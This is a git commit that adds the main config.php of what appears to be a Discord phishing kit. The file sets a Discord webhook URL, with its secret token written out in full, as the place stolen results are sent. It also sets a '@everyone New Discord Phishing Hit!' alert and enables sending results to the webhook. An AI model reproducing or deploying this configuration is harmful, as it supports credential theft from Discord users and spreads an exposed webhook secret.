952b59becbcbc67fd1fac430c7fc68c519244944
Ur1t <79524408+Ur1t@users.noreply.github.com>
2023-03-14 15:17:59 +0000

    Add files via upload

---
+++ config.php
@@ -0,0 +1,7 @@
+<?php
+// MAIN CONFIG
+$WEBHOOK = "https://discord.com/api/webhooks/1085148670674075729/_owjIAWiFKD1p2grCa0G4hWav02qHO89tb__F8TTtULeUe0y_wS_ls_HOxAY9IdaeJ-J";
+$webhookpfp = "https://cdn.discordapp.com/attachments/1059666771457605635/1059714386249392209/delsiyapfp.png";
+$embedmsg = "@everyone **New Discord Phishing Hit!**";
+$SAVE_TO_TXT = FALSE;
+$SEND_TO_WEBHOOK = TRUE;
